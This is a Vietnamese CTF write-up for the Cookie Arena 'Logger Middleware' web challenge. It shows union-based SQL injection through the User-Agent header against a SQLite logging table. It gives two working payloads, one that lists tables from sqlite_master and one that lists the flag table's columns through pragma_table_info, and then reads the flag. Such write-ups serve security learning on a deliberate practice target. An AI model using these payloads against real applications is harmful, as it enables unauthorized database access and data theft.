---
title: Logger Middleware Writeup - Cookie Arena
date: "2023-08-01 16:22:15"
categories:
  - CTF Writeup
  - Cookie Arena
tags:
  - middleware
  - SQL Injection
published: false
---

Link Challenge: [https://battle.cookiearena.org/challenges/web/logger-middleware](https://battle.cookiearena.org/challenges/web/logger-middleware){:target="\_blank"}.

![access log page](/posts/logger-middleware-cookiearena/access-log.PNG)

Tương tự với [Baby Logger Middleware](/posts/baby-logger-middleware-writeup-cookie-arena/) nhưng khó hơn 1 chút xíu, vẫn lại là sql injection.

![error query](/posts/logger-middleware-cookiearena/error-sql.png)

Đã biết số lượng columns trong bảng logger, tiến hành test Union-Based SQLi

![test union-based sqli](/posts/logger-middleware-cookiearena/test-union-based-sqli.png)
_Union-Based SQLi_

Google 1 chút về sqlite, cũng nắm sơ qua về nó rồi thì bắt tay vào viết payload thôi.

```
User-Agent: ',null,null,null,null) union select null,group_concat(name),null,null,null,null from sqlite_master-- -
```

![List Tables](/posts/logger-middleware-cookiearena/tables.png)
_Liệt kê tables trong sqlite_master_

Yep, chính nó, bảng **flag**.

```
User-Agent: ',null,null,null,null) union select null,group_concat(name),null,null,null,null from pragma_table_info('flag')-- -
```

![List Columns](/posts/logger-middleware-cookiearena/columns.png)
_Liệt kê columns trong bảng **flag**_

Cột **secr3t_flag** chắc chắn chứa flag rồi. Let's catch it!

![secr3t_flag](/posts/logger-middleware-cookiearena/flag.png)
_secr3t_flag_
